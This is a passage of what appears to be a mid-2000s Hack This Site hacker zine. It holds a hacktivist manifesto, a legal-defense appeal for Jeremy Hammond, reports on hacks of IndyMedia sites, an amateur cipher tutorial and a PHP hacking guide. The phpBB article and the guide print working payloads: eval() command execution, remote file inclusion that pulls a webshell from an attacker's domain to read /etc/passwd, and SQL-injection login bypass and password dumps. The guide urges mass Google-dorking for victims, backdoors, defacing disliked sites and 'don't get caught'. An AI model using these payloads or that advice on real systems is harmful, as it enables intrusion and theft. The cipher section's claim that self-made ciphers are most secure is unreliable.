political\r\nactivists working together. Time and time again,\r\nhistory proves that people have the ability to\r\norganize cooperatively to put direct pressure on\r\npoliticians and institutions to make progressive\r\nchanges. Hopefully this will set a precedent for\r\nfuture successful electronic civil disobedience\r\ncampaigns in the years to come."]}

A Hacktivist Manifesto: Notes from the Hacker Underground         #\r\n################################################################################\r\n\r\nAs our hacking and activist communities grow, the ruling classes will try to\r\nreact to stop us. We live in an age where our every thought and move is\r\nmonitored, and to question the injustices of our society are demonized as\r\nunpatriotic. The corporate media scares the public with images of evil hackers\r\nand cyber-terrorists so congress can give more money to law enforcement and the\r\nministry of peace. The Office of Homeland Security, the USA PATRIOT Act, Total\r\nInformation Awareness. Goerge W. Bush, Dick Cheney, John Ashcroft. The threat of\r\nfascism in America is not an impending threat: it's already here, and the lines\r\nare clearly drawn.\r\n\r\nInevitably those who question and confront the injustices of the political\r\nsystem will become targets for harassment by the rich and powerful. These words\r\nare coming to you from someone who is facing the full weight of these changes\r\nfirst hand. The success of Hack This Site as well as my participation in\r\norganizing a number of protest actions has made me a target of law enforcement.\r\nMy apartment was raided by Chicago FBI who seized all of my equipment and is\r\nthreatening me with felony charges citing millions of dollars in damage and up\r\nto thirty years in jail for a crime that hasn't even happened.\r\n\r\nThis is the reality of the political system we live in: the rich and powerful\r\nhave no regard for human rights, and will do everything in their power to crush\r\nany sort of resistence against their empire. The feds are in the business of\r\nbreaking lives and have had no reservations in making the most of these sweeping\r\nchanges. IndyMedia servers are seized by international law enforcement. The FBI\r\nquestions, raids, and arrests dozens of hackers a year even from here at Hack\r\nThis Site, HBX Networks, and various IndyMedia collectives. They grab server\r\nlogs for servers that host hacker and anarchist websites like Infoshop.org\r\ninsecure.org, etc. Police arrested over 1800 people at the protests at the 2004\r\nRepublican National Convention while the the FBI and the Secret Service\r\ninvestigate key organizers. When they had visited me, they had quoted several\r\ncomments from Hack This Site's IRC server.\r\n\r\nThe reason why we are being monitored and indimidated is because they know what\r\nwe are capable of doing if we realize our collective power and start doing\r\nsomething about it. The stakes are high, but they aren't unbeatable. The biggest\r\nweapon in their arsenal is how they can control people through fear. But every\r\nday, we hear stories about people who were smart and brave enough to outsmart\r\nthem. If we let them walk all over us, then they win. If we organize and put up\r\na fight, then their grip is loosened and the truth may flow freely as the wind\r\nand trees. These are the opening shots in a war they say will not end in our\r\nlifetime.\r\n\r\nThe struggle to build a free internet and a free society has yielded some\r\namazing results. We have developed open source software, peer to peer file\r\nsharing services, secure and anonymous open publishing systems, and much more\r\nthan can be explained here. And every time we develop these exciting new\r\ntechnologies that let us pursue our creativity and innovation more freely, the\r\nestablishment tries to keep up by inventing increasingly ridiculous legislation\r\nto stop us. But we will always be one step ahead of them: while they react, we\r\ncreate.\r\n\r\nThe balance of power between revolutionary hackers and the reactionary corporate\r\ngovernment will exist in various degrees at all times. The problem isn't going\r\naway anytime soon. Instead of spending time fighting amongst ourselves, we need\r\nto work together to find solutions. Embrace a diversity of tactics and unite\r\nwith our brothers and sisters to build a front to combat the right wing police\r\nstate. Not only do we need to build defensive networks to circumvent their\r\nsecurity and censorship, we need to take direct action and bring an end to the\r\ncorporations and governments that stand in our way. While they are fighting for\r\ntheir paycheck, we are fighting for our lives.\r\n\r\nHacktivists of the world, unite!\r\n\r\n################################################################################\r\n#                     02.

Facing intimidation from both the FBI\r\nand the Secret Service, he is being accused of hacking into right-wing website\r\nProtestWarrior.com and stealing credit card numbers. While the website had not\r\nbeen damaged and no credit cards were billed, the FBI is threatening to charge\r\nhim with fraud and unauthorized access totalling to millions of dollars in\r\ndamages and up to thirty years in federal prison for a crime that hasn't even\r\nhappened.\r\n\r\nJeremy Hammond aka xec96 was the founder of online hacking community\r\nHackThisSite.org which taught network security skills through a series of online\r\nhacking challenges. With his coordination the website was able to publish a\r\nseries of magazines, launch an online hacktivist radio station, and start\r\nseveral hacking competitions. Because it has grown to be increasingly\r\ncontroversial, it is facing overblown intimidation from unjust law enforcement\r\npolicies despite being legal and non-destructive in nature.\r\n\r\nJeremy has also worked with several local and national anti-war groups to\r\norganize for a variety of marches, rallies, and national demonstrations\r\nincluding the Republican National Convention in NYC, the counter-inauguration\r\nprotests in Washington DC, and dozens of other local Chicago actions. Jeremy\r\nHammond is an innocent man who is being targeted for his participation in the\r\nstruggle for social justice and the success of the Hack This Site community. His\r\npassion and determination to challenge the injustices of the rich and powerful\r\nhas made him a target of harassment by law enforcement.\r\n\r\nPlease ask the US District Attorney's Office to drop the charges!\r\n\r\nFreeJeremy.com Legal Defense\r\nFreeJeremyNow@gmail.com\r\nContact: Loren Blumenfeld, attorney - 312-939-0140\r\nContact: Pong Khumdee, partner and roommate  pongtakespictures@gmail.com\r\nContact: Wyatt Anderson, administrator of HTS: wanderson@gmail.com\r\n\r\nWho is Jeremy Hammond?\r\n----------------------\r\nJeremy was a political hacker who used his abilities to defend a free internet\r\nand a free society. He has founded a number of projects including several\r\nprogressive newspapers, educational websites, and helped organize a series of\r\npolitical protests. He has worked to defend the IndyMedia project from\r\nright-wing hackers by finding and fixing several vulnerabilities. While his\r\nactivities have been ethical and non-destructive, he has found himself a target\r\nof law enforcement because he has been brave enough to stand up to the\r\ninjustices of the political system.\r\n\r\nJeremy Hammond was the founder of online hacking community HackThisSite.org\r\nwhich taught network security skills through a series of online hacking\r\nchallenges. With his coordination the website was able to publish a series of\r\nmagazines, launch an online hacktivist radio station, and start several hacking\r\ncompetitions. While the site has grown it has become increasingly controversial.\r\nThe site and community is facing overblown intimidation from law enforcement\r\npolicies, despite being legal and non-destructive in nature.\r\n\r\nJeremy also worked with several local and national anti-war groups to organize\r\nfor a variety of marches, rallies, and national demonstrations including the\r\nRepublican National Convention in NYC, the counter-inauguration protests in\r\nWashington DC, and dozens of other local Chicago actions.\r\n\r\nHow and why is Jeremy being threatened by the FBI?\r\n--------------------------------------------------\r\nOn March 17, 2005, Jeremy's apartment was raided by nine FBI agents who\r\nransacked the plane, seizing all electronic equipment as well as the house\r\nphone/address book, the lease, important notebooks, and even an XBox. Since\r\nthen, Jeremy and his lawyer have been meeting with the US attorney and the FBI.\r\nThe US government says that they will be indicting him with several felony\r\ncharges related to computer hacking and credit card fraud.\r\n\r\nJeremy was also visited by the United States Secret Service on April 13 who\r\nchecked out his apartment and asked Jeremy a few questions related to his\r\npolitical activities. They were asked by the FBI who tipped them off about\r\nJeremy's protest activities and anarchist tendencies. The SS asked about what\r\npolitical groups he has worked with, what protests he has been to, whether he\r\nwas going to assasinate the president, etc.\r\n\r\nThe FBI has stated that they have been monitoring Jeremy's actions for at least\r\nsix months (since Summer 2004) when the FBI first visited Jeremy questioning him\r\nabout possible disruption and violence at the Republican National Convention\r\nprotests in NYC late August. The FBI has gone as far as quoting several private\r\nconversations from the Hack This Site IRC server, talked about places Jeremy has\r\nbeen, etc. They also say that they have stopped by his apartment on several\r\noccasions to check up and take pictures. His phone and internet connection is\r\nalmost certainly tapped as the FBI has stated that they will be watching his\r\nevery action and statement.\r\n\r\nWhat is Jeremy being accused of doing?\r\n--------------------------------------\r\nThe FBI alleges that he is involved with an underground hacking group that has\r\nhacked and gained acess to the right-wing website ProtestWarrior and took credit\r\ncard numbers belonging to people who ordered products off of their online store.\r\nThe FBI says that he was involved in a plot to make donations from these credit\r\ncard numbers to various humanitarian charities, civil rights activists, and\r\nleftist protest groups.\r\n\r\nThese charges are outrageous and reactionary because none of this has actually\r\nhappened. The website has not been defaced and no credit card numbers has been\r\nbilled. The FBI and the US Attorney have quoted several million dollars of\r\ndamages(~$500 per credit card) and is threatening up to thirty years in federal\r\nprison for a crime that has not been committed.\r\n\r\nWho is ProtestWarrior?\r\n----------------------\r\nProtestWarrior.com is a right-wing group that tries to provoke and disrupt\r\nconstitutionally protected protests and actions of progressive organizations.\r\nThey foster such conservative and intolerant dogma which borders on abusive\r\nhate-speech. Their most recent national action was their attempt to cause\r\ntrouble at the counter-inaugurationprotests in Washington DC where they failed\r\nmiserably in being effective or generating any decent numbers of supporters.\r\n\r\nAlthough no damage had been done to their system, the ProtestWarriors have been\r\nknown to falsely report information to the police on an intempt to incriminate\r\nand demonize leftists. This particular case is similar: while no damage has been\r\ndone to the website or credit cards, ProtestWarrior is trying to demonize and\r\nincriminate hackers and activists.\r\n\r\nWhat is ironic is that ProtestWarrior has worked with groups like\r\nRightWingExtremist.net and the g00ns to hack IndyMedia and other leftist sites\r\nin the past. Read an in-depth discussion of ProtestWarrior, what they stand for,\r\nand how to expose them: http://indymedia.us/en/2005/03/5268.shtml\r\n\r\nWhat property has the FBI seized?\r\n---------------------------------\r\nNearly everything electronic has been seized from their house, in addition to a\r\nnumber of private notes and documents including notebooks as well as a copy of\r\ntheir lease. In addition to taking Jeremy's property, they have also seized his\r\nroommate's computers and other equipment which were unrelated to the incident.\r\nDetails of all property seized are included in the search warrant receipt.\r\n\r\nWhile it has been more than two months since the original incident, the FBI has\r\nnot filed charges nor returned any property. We are sending out an official\r\nMotion for Return of Property, which the FBI is required to do under Rule 41(e)\r\nof the Federal Rules of Criminal Procedure.\r\n\r\nHow could I support the case against these ridiculous charges?\r\n--------------------------------------------------------------\r\nSupport can range from signing the online petition, making a donation,\r\ncontacting the US Attorney, or just by spreading the word about Jeremy's\r\nsituation. Please see the support page for more details.\r\n\r\nAre copies of the search warrant available?\r\n-------------------------------------------\r\nElectronic copies of the search warrant can be downloaded at the website\r\nFreeJeremy.com.

Right Wing Hackers Target Indymedia                     #\r\n################################################################################\r\n\r\nA number of people have started to organize and attack various Independent Media\r\nCenters as well as a number of other progressive and leftist websites. In the\r\npast, these attacks have ranged from simple XSS attacks which redirect visitors\r\nor trashing the filesystem / databases. The people responsible show no\r\nunderstanding of the ideas behind the open publishing system IndyMedia, which is\r\nfree for all users to participate in the discussion. These actions are not\r\nhacking nor hacktivism: they utilize public pre-written exploits to simply\r\n\"shout the other side down.\" An attack on IndyMedia is an attack on free speech\r\nitself. These right-wing extremists need to be confronted and exposed as the\r\nonline fascists they really are.\r\n\r\nDuring the Republican National Convention, a group of hackers called\r\nRightWingExtremist.net was formed by Brett Chance(elac, clorox, awb0t, etc) from\r\nPlano TX. This group came out of the ultra conservative ProtestWarrior.com who\r\nadvocates disrupting and attacking leftist organizations. Their actions had\r\nstarted with minor stuff like launching ddos attacks on NYC IndyMedia. Later\r\nthey discovered a XSS flaw  in dadaIMC that allowed them to post news that would\r\nautomatically redirect users to his own website where it would play sounds that\r\nsaid childish political rhetoric like \"the nazi indymedia wants to destroy\r\nisrael,\" etc. Because of pressure from the online community, Brett from\r\nRightWingExtremist. net closed down the site for several months.\r\n\r\nMonths later, Jeremy from HackThisSite.org discovered a flaw in dadaIMC that\r\nallowed the upload of malicious PHP files would could be used to take over the\r\nentire server. This announcement was quietly made to dadaIMC who was urged to\r\nkeep it private until the tech staff of every indymedia center was notified and\r\nhad their scripts patched to protect themselves. Several other independent\r\nIndyMedia centers were notified and had their code base patched. But before the\r\nmajority of sites were patched, DadaIMC posted the vulnerability information on\r\nthe website, including instructions on how it can be exploited.\r\n\r\nA month later a group calling itself the g00ns.com have attacked and defaced a\r\ndozen indymedia websites using the vulnerability posted to dadaimc. On the\r\nhacked websites, a message calling indymedia \"liars\" and \"anti-republicans\" were\r\nposted. Soon after, hackers and indymedia techs started working together to fix\r\neach other's code and bring backups back online as well as find information\r\nabout the g00ns. The g00ns started out by targetting and attacking online gaming\r\nclan websites, but eventually Elac from RightWingExtremist.net joined up and\r\nstarted to turn the group farther to the right. When the IndyMedia sites were\r\nhacked, people started to gather information and infiltrate their organization\r\nand soon after all of their private details were released to the public to show\r\nactions like this will not go unnoticed.\r\n\r\nMany other right-wing trolls continue to try to disrupt IndyMedia and left-wing\r\nprotest groups. These individuals operate under several different names\r\nincluding ProtestWarrior.com, RightWingExtremist.net, FreeRepublic.com,\r\nKobeHQ.com, FreeDominion.com, LittleGreenFootballs.com, and more. Many of these\r\ngroups are suspected of being financed operations from governments or\r\ncorporations similar to the COINTELPRO program from the '60s and '70s. Common\r\nactivities range from flooding message boards, faking votes and reviews in\r\nonline polls, releasing personal information of key organizers, spreading false\r\nrumors and scandals, etc.\r\n\r\nAll IndyMedia centers running DadaIMC are strongly encouraged to patch their\r\nsoftware, but more importantly, hackers need to work with activist groups around\r\nthe world to make sure their software is secure, encrypted, and anonymous.\r\nDetails on the vulnerability are at:\r\nhttp://www.dadaimc.org/mod/software/alerts/dadaIMC/index.php?alert=1\r\nhttp://www.dadaimc.org/support.php?section=xss\r\n\r\n################################################################################\r\n#              05.

Two days after prole.info was threatened to provide\r\naccurate details or be faced with the domain being shut down.\r\n\r\nThis is a gross privacy violation, and it is unfair that it seems to be very\r\nloosely and even selectively enforced.

Phpbb 2.10 Disclosure cause mischief and mayhem on the net          #\r\n################################################################################\r\n\r\nIn use by millions of websites all over the internet, phpBB is one of the most\r\npopular message board systems. You can imagine the mayhem that ensued when a\r\nmajor vulnerability was discovered late November 2004 that allowed the execution\r\nof commands on all major versions prior to 2.0.10.\r\n\r\nMany users might remember Jessica Soules as a developer for Hack This Site. No\r\none expected her release of the bug to Bugtraq would result in such an explosion\r\nthat caused several major worms that killed tens of thousands of websites and\r\nbless script kiddies with easy to use tools to take down a server.\r\n\r\nThe vulnerability lies in viewtopic.php, which does not correcty validate the\r\nuser-supplied \"highlight\" variable as it is passed to PHP's eval() command. You\r\ncan break out of their command and issue your own PHP commands, including the\r\nsystem() command, allowing remote execution of commands. You could craft a URL\r\nsimilar to /viewtopic.php?\r\nt=2&highlight=%2527%252esystem(chr(108)%252echr(115))%252e%2527, which would\r\nexecute \"ls\" giving you a directory listing.\r\n\r\nThis exploit opens the machine up for you to play with the permissions of\r\nwhatever the web server is running as. From here you could perform a wide range\r\nof actions from grabbing password information from config files or install\r\nbackdoors or just simply fuck up their forums. The box is essentially yours to\r\nplay with, and it shouldn't be difficult to find ways of gaining higher\r\npermissions to take over the machine entirely.\r\n\r\nIt wasn't long before someone wrote a perl script to search google for\r\nvulnerable targets to attack and spread itself to. The Santy(or\r\nNeverEverNoSanity) worm ran at least 20 generations and killed an estimated\r\n40,000 websites before google disabled the search queries that allowed the worm\r\nto spread. Several modifications of the worm changed search engines and queries\r\nslightly that allowed it to spread once again. The payload of the worm was to\r\nwipe all files and replace it with \"This website has been defaced!!!\"; For such\r\na cleverly written worm, the author didn't have a whole lot to say, and caused a\r\nwhole lot of random destruction and ruined things for hackers who wanted to use\r\nthe phpBB bug for more legitimate purposes.\r\n\r\nThe release of this major bug has had some massive implications. In the future,\r\nwe advise against disclosing such vulnerabilities because of the potential side\r\neffects of script kiddies or destructive worms. Since Jess released it to\r\nBugtraq, she has been under constant harassment from phpBB, her hosting\r\nprovider, and other groups who have been personally affected by the phpBB hack.\r\nIn finding such a devestating security hole in such a major piece of software,\r\nJessica will go down in history.\r\n\r\n################################################################################\r\n#            07. Nmap Developers Intimidated by FBI   By Wyrmkill              #\r\n################################################################################\r\n\r\nFyodor, the creator of the Nmap portscanning says he is being pressured by the\r\nFederal Bureau of Investigation for copies of the Web server log that hosts his\r\nWeb site, Insecure.org\r\n\r\nNmap is an open source tool designed to help security experts scan networks,\r\nservices and applications. Federal agents are trying to  intimidate hackers who\r\ndownload and use these tools, no matter what they do with  it.\r\n\r\nFyodor made this announcement in his blog, \"FBI agents from all over the country\r\nhave contacted me demanding Web server log data from Insecure.org. They don't\r\ngive me reasons,but they generally seem to be investigating a specific attacker\r\nwhom they think may have visited the Nmap page at a certain time.

The Art of the Cipher   By Psyche                       #\r\n################################################################################\r\n\r\nCryptography is the term given to the study of encryption, or making data secret\r\nby hiding its meaning in layers of alteration.. Great, but why should I bother\r\nreading this? I can use an encryption program...There are a great many well\r\nknown ways of encryption. To name a few: the Caeser Shift, the Enigma code, MD4,\r\nMD5, Xor and many more. There are also alot of programs tailored to cracking\r\nthese methods, thereby making these forms of encryption less and less secure.\r\nGreat! Get the point please! I'm a busy person! Thus, there is not an encryption\r\nmore secure than one you have devised yourself; nobody else knows how it works\r\nso there is no program to decrypt it. This article has a brief guide to creating\r\nyour own cipher in four easy steps.\r\n\r\nStage 1: Lost in Encryption\r\n\r\nFirstly we need a string to encrypt: PURPLE CARS ARE MORE FUN. The first step in\r\ncipher creation is devising a way of hiding your data, there are three main\r\nschools of doing this. Substitution - Replacing the letters in a string with\r\nother letters, numbers,symbols etc. Shift - Altering the position of a letter in\r\na string, or shifting the letter along the alphabet or ASCII table. Rail -\r\nChanging the presentation of the string to make it harder to comprehend. I am\r\ngoing to implement a simple substitution, replacing each letter in the string\r\nwith the one directly proceeding it in the alphabet, making our sting:\r\n\r\nPURPLE CARS ARE MORE FUN otqokd bzqr zqd lnqd etm\r\n\r\nWhere the letter A is in the string it has been counded around again in the\r\nalphabet, making the new letter Z. So, we can mathamaticly display our cipher as\r\nX-1, where x is a letter in our string. This however is horrendously insecure,\r\nand can easilly be decrypted by anoyone with an understanding of cryptography.\r\nSo, we need to add something to make it harder.\r\n\r\nStage 2: Variables\r\n\r\nFor those who are unfamiliar with the workings of algorithm based cryptography a\r\nbrief synopsis is as such: X*N*K X being the numerical value of the letter or\r\nword to be encrypted. N being any given number and K being the key. The key is a\r\nnumber which can be constantly changed to alter how the string is encrypted. In\r\nalgorythim encryptions the key forms the variable. The shortcoming of such\r\nalgorithim based encryptions is that any number crunching program can eventually\r\nbe solved. Variables are just what they sound like, something that can be\r\naltered in the cipher to alter the outcome. Variables can be easilly changed to\r\nprotetct intregrity and foil any decrypting attempts. For this example i will be\r\nimplimenting a variable as follows; 7x. Where X is the numerical value of the of\r\na letter (I could make this alot more difficult however I want a cipher that can\r\nbe fairly easilly decrypted, by me anyway) Thus making the cipher without the\r\nvariable added: o t q o k d b z q r z q d l n q d e t m 15 20 16 15 11 4 2 24 17\r\n18 24 17 4 12 14 17 4 5 20 13\r\n\r\nAnd with the variable added:\r\n\r\n105 100 119 105 77 28 14 168 119 126 168 119 28 84 98 28 35 100 91.\r\n\r\nHowever this is still in essence substitution and can be fairly easily cracked.\r\nThe main benefit is that it has a basis for alteration at a moments notice.\r\n\r\nStage 3: Constants\r\n\r\nAdding a constant has one big advantage, it stops any letter/number/symbol from\r\nbeing repeated, which helps protect it from frequency based attacks. I will be\r\nusing square numbers as my constant.

A brief inroduction into the construction\r\nof a cipher.

Finding and Exploiting php Script Vulnerabilities             #\r\n################################################################################\r\n\r\nYou can spend all your time making sure all your services are patched, install\r\nexpensive firewalls and tripwire software, and make sure all your communication\r\nis done over SSL. But even the more complex and secure server can all go to\r\nwaste if you are using insecure PHP code. More and more people are realizing the\r\nweight of web application security holes. Instead of talking about specific\r\nexploits that come and go, I will try to explain some techniques that will help\r\nto find vulnerabilities in PHP software and how to exploit them to gain access.\r\n\r\nOften most vulnerabilities are not in the actual server software but in poorly\r\nwritten code or irresponsible configuration. Most of the time it comes down to\r\nnot validating input before it is passed to vital system functions. At the\r\nworst, this will allow you to execute commands from the same user that the web\r\nserver is running at (usually www, apache, or nobody) which usually has a\r\nrelatively low level of permissions on the server. It's not much, but the access\r\ncan be exploited further to possibly gaining more permissions on the machine,\r\nreading sensitive information, or depending on how poorly the server is\r\nconfigured(folders and files chmodded to 666, passwords and configuration files\r\nlying around, etc), it could be devestating indeed.\r\n\r\n$The Fundamentals;\r\n------------------\r\nIf variables are passed from your client to their server, you can change these\r\nvalues to anything you'd like. This is one of the most fundamental principles\r\nbehind web security. If you see a link like 'index.php?section=links', their\r\nscript examines the variable 'section' and responds accordingly. While there may\r\nnot be a way to modify the value of this variable on their site itself, you\r\ncould do so through a number of ways.\r\n\r\nThere are three ways variables can be passed from your browser to the PHP\r\nscript: over GET, POST, or cookies. Variables being sent over the address bar\r\n(like asdf.php?var1=somevalue&var2=anothervalue) is known as the GET method and\r\ncan be changed directly in the URL bar. Variables sent from a form are sent over\r\nPOST, and can be changed either by creating your own HTML page with a form of\r\nyour own, or by forging your own HTTP request using the HTTP protocol(this can\r\nbe done using telnet on port 80 - see rfc2616 for specific commands). Cookies\r\nare saved and sent in a number of different ways varying on your operating\r\nsystem and web browser. If you can't find a way to change the values of your\r\ncookies through a GUI interface, you can change the values through forging your\r\nown HTTP request as well.\r\n\r\nMany times you can use any of the above methods to set a variable inside of a\r\nscript. But more and more php configurations have register_globals off. If this\r\nis the case, PHP scripts have to refer to variables like $_GET['varname'],\r\n$_POST and $_COOKIE. This restricts you into setting variables using the method\r\nthey were intended to be used with. This does not make it invincible, but it\r\nforces you to spoof the variable in the way that the script is expecting the\r\ninput.\r\n\r\n$Generating Errors;\r\n-------------------\r\nOnce you find out how to inject different values into variables of a web\r\napplication, you should try to generate an error code. This can be done by\r\ninserting all sorts of (not so) random characters into these scripts. Very often\r\nscripts will dump all sorts of messages that could help you find out their\r\ndatabase structure, file paths, and more.\r\n\r\nIf you found a script similar to index.php?file=links.php, and tried changing it\r\nto index.php?file=linksaaaa.php, it might give you an error similar to:\r\n\r\nWarning: main() [function.include]: Failed opening 'includes/linksaaaa.php' for\r\ninclusion (include_path='.:/usr/lib/php:/usr/local/lib/php') in\r\n/home/www/public_html/index.php on line 45\r\n\r\nThis will give you all sorts of useful information: the location of the web\r\nroot, as well as the previous information that they are using a statement\r\nsimilar to include \"includes/$file\", which is vulnerable. You might want to also\r\ntry looking in /includes to see if any additional information is stored there.\r\n\r\nScripts that use SQL statements might also reveal information about the SQL\r\nserver and maybe even a portion of the SQL statement, possibly giving names of\r\ntables and fields.\r\n\r\nMicrosoft OLE DB Provider for ODBC Drivers error '80040e14' [Microsoft][ODBC SQL\r\nServer Driver][SQL Server]Unclosed quotation mark before the character string '\r\norder by DESCRIPTION '. \r\n/products.asp, line 6\r\n\r\n$Finding Vulnerable Scripts;\r\n----------------------------\r\nNow that you have an idea of what sort of vulnerabilities to look for, the fun\r\nbegins when you start looking for targets to practice on. You could sweep for\r\ntargets broadly through clever google searches. You could also start downloading\r\nthe source code to major PHP software and go through it with a fine toothed comb\r\nlooking for mistakes. But most of the vulnerabilities I find are ones stumbled\r\nupon through casual browsing.\r\n\r\nYou can also try specifically looking for vulnerabilities by downloading the\r\nsource code to popular systems and parsing it for known PHP vulnerabilities. A\r\ngood place to start would by http://php.resourceindex.com, which has a large\r\ncategorized repository for most PHP scripts. You can do all sorts of searches to\r\ngrep the source code for vulnerabilities(like the ones listed above) and see if\r\nyou can find instances where input is passed to these system functions\r\nunchecked.\r\n\r\nHacking through google is a very fine art and can yield hundreds or thousands of\r\nvulnerable machines with a single query. If you find a piece of vulnerable\r\nsoftware, you might try looking for websites that run that same software. Often\r\ntimes scripts will leave a small tag at the bottom of the page, so you can\r\nsearch for \"Powered by GenericMessageBoard v1.02\" to find targets. You could\r\nalso search for specific names of scripts through something like\r\ninurl:\"/funbb/viewtopic.php\". You could also search for generic scripts like\r\ninurl:\".php?file=\" or variations thereof. Often times developers will poorly\r\nconfigure their systems and make silly mistakes like leaving backup/config files\r\naround or directories open. Much of this information can be extracted through\r\nclever searches. Google hacking can become quite complex and can help assess and\r\npenetrate systems with some amazing results. A great place for more information\r\nwould be http://johnny.ihackstuff.com.\r\n\r\n$Disclosure;\r\n------------\r\nThis is a topic of great debate in the hacking community. Upon finding a\r\nvulnerability, what do you do with it? There are advantages and disadvantages\r\nthat come with disclosing a security hole which need to be weighed with your\r\npersonal morality.\r\n\r\nIf it is a large piece of software used by many websites, you could post it to\r\nBugTraq and receive quite a bit of attention and credit if you word things well\r\nand handle it correctly. If you go this route, many people feel that before you\r\npublically release a major vulnerability it would be good practice to notify the\r\nvendor so that they can release a patched version. Of course, you would also be\r\ngiving script kiddies ammunition to attack other sites with. The vulnerability\r\nwould also lose it's appeal of being 'hot' because everyone's got it now, and\r\nsoon most websites will be running patched software. Many people believe it is\r\nbest to keep vulnerabilities on the down low, but nothing will stop it from\r\neventually being released to the public.\r\n\r\nIf the vulnerability lies in the custom code of someone's website, your actions\r\nshould depend on what sort of website it is, what sort of service they provide,\r\netc. If they are in general an honest, good hearted group of people, it wouldn't\r\naccomplish much to trash their site. If it's a nazi, pro-war or hate-filled\r\nsite, it is a different story. Many people feel that a simple defacement isn't\r\nreally harmful as long as you don't delete files and if you notify the web\r\ndeveloper how it is fixed, and for the most part unless it is a major\r\ncorporation you don't have to worry about any sort of investigation especially\r\nif you use a proxy.\r\n\r\n$Validating Input + Secure Coding;\r\n----------------------------------\r\nThere are all sorts of techniques webmasters use to validate input, and it\r\nlargely depends on what system functions the input is being passed to and what\r\nyou are trying to defend against.\r\n\r\nIf you are using include, require or fopen statements, consider using a function\r\nlike is_file() to verify that you are including an actual file stored on the\r\nmachine as opposed to PHP code on another server. You should also strip all\r\nspecial characters like periods, commas, and slashes, to prevent someone from\r\ndoing something like include(\"/includes/../../../../etc/passwd\"). You might want\r\nto also set open_basedir restrictions on to prevent people from leaving the web\r\nroot and including sensitive system files and configurations.\r\n\r\nTo defeat most SQL injection issues, you should make sure to use addslashes()\r\nbefore passing anything to mysql_query and then stripslashes() when retrieving\r\ndata. You should also consider typecasting input to an integer if you are doing\r\nsomething similar to products.php?category=3 or viewitem.php?id=44. PHP also\r\nprovides two commands, escapeshellcmd() and escapeshellarg(), which can be\r\nuseful to strip input before it is passed to a exec() function.\r\n\r\nIf information is being stored in a database to be displayed to users later, you\r\nshould sanitize input as to prevent cross site scripting vulnerabilities as well\r\nas prevent people from causing general mayhem by opening tags and never closing\r\nthem. Consider using str_replace to convert all < and > characters to < and\r\n>s to prevent people from starting html tags or javascript code blocks. You\r\nmight also want to strip all newline characters and other special codes.\r\n\r\nFor all purpose validation, consider checking a variable against a series of if\r\nor switch statements to see whether the value is allowed before passing it off\r\nto functions:\r\n\r\nswitch ($page) {\r\n  case \"links\":\r\n    echo \"Links!\"\r\n    include \"includes/links.inc.php\";\r\n    break;\r\n  default:\r\n    die(\"Sorry, not valid input.\");\r\n}\r\n\r\nThe most secure method would be to strip input of everything except for\r\nalphanumerics. This can be accomplished through the use of regular expressions:\r\n$str = preg_replace (\"/[^a-z 0-9]/i\",'',$str);\r\n\r\nIt is also a good idea to surpress output of a function as to prevent error\r\ncodes from helping hackers from gaining information about your system\r\nconfiguration, database layout, file structure, etc. You can do this by sticking\r\na @ in front of the function name: $result = @mysql_result(\"SELECT * FROM\r\nadmin_users\");\r\n\r\nThere are also a number of PHP config options that can help secure a machine.\r\nturning open_basedir on will prevent a file from accessing files outside of it's\r\nbase directory(preventing attacks like including ../../../../etc/passwd).\r\nTurning magic quotes on will automatically escape quotes from input into to\r\nprevent Turning safe mode on allows a number of precautions like disabling or\r\ninhibiting system functions such as system/exec/passthru, include/require, etc.\r\nTurning register_globals off will force PHP scripts to reference input from\r\nusers like $_GET['varname'], $_PUT or $_COOKIE instead of referencing them\r\ndirectly like $varname. As of PHP 4.2.0, this has been made the default option.\r\nThis helps for poorly written scripting which might allow users to inject values\r\ninto variables. \r\n\r\n$Rousing Conclusion;\r\n--------------------\r\nThis guide should at least point you in the right direction as far as finding,\r\nexploiting, and fixing common PHP input validation vulnerabilities, and give you\r\nsome idea of what you can do with it. Most web vulnerabilities will provide you\r\nwith a foot in the door where you can try other tricks to try to elevate\r\npermissions and gain further access. You should also check out ways of securing\r\nyour level of access through backdoors and burying yourself in system files. \r\nYou can play with many of the concepts explained here on some hacking \r\nsimulations at hackthissite.org. Or you can try some clever google searches and\r\nfind a billion machines in the wild =) Have fun, cause mischief, and don't get\r\ncaught!\r\n\r\n\r\n$Real World Examples;\r\n---------------------\r\nHere are some real world examples of the vulnerabilities explained in this\r\ndocument. This small list is just a preview of the kind of stuff that is\r\ndiscovered every day.\r\n\r\nphpMyAdmin 2.6.1 Remote File Inclusion\r\nallows you to read arbitrary files\r\nhttp://[HOST]/[DIR]/css/phpmyadmin.css.php?GLOBALS[cfg][ThemePath]=/etc&theme=\r\npasswd%00\r\n\r\nRemote PHP Code Execution: vBulletin 3.06 and below:\r\ninjects PHP code through invalidated eval statement\r\n http://[target]/misc.php?do=page&template={${phpinfo()}}\r\n\r\nphpMyFamily <= 1.4.0 SQL injection admin bypass:\r\ninjects sql code which allows you to login as an administrator:\r\nLogin: ' OR 'a'='a' AND admin='Y'/*\r\nPassword: (empty)\r\n\r\nPHP Form Mail 2.3 Arbitrary File Inclusion\r\nallows php code execution and remote unix commands\r\nhttp://[target]/[dir]/inc/formmail.inc.php?script_root=http://asdf.com/phpcode.\r\nphp\r\n\r\nMiniBB 1.7 SQL Injection\r\nreveals admin passwords through sql injection vulnerability\r\nhttp://[target]/minibb/index.php?action=userinfo&user=1%20union%20select%201,2,\r\nuser_password%20from%20minibb_users/*\r\n\r\n\r\nKeep your eye open for the following types of vulnerable PHP scripts:\r\n\r\ninclude, require, or fopen\r\n--------------------------\r\nIf input is passed to include, require, or fopen in ways similar to:\r\ninclude \"$page\" or require \"$page\";\r\n\r\n... then depending on the server configuration, you could either read files off\r\ntheir machine or even execute your own PHP code. By setting $page to something\r\nlike '/etc/passwd' or \"../../admin/.htaccess\", you could read sensitive data off\r\nof their machine like server config files or passwd files. In many systems if\r\nyou pass a URL to include() their server will make an http connection grab the\r\nfile and execute php code. This means you can write a script like <?php echo\r\npassthru($cmd); ?>, save it on your webserver, and call their script like\r\ninclude.php?file=http://www.yourdomain.com/passthru.php&cmd=cat /etc/passwd . \r\n\r\nDepending on how they modify their statement (like include \"includes/$page\",\r\ninclude \"$page.php\", etc) it may limit what you can do or make it a bit more\r\ndifficult. Often times error statements will reveal the path of the script as\r\nwell as what input they are passing to include.\r\n\r\nWarning: Unable to access fun in /home/sites/18/web/cia/include.php on line 1\r\n\r\nIf a script ends your input with an extension(like include\r\n\"/path/to/$file.inc\"), you may be forced to reading files only ending with a\r\n.inc - unless they are running specific combinations of php and their os which\r\nmay allow you to add a %00 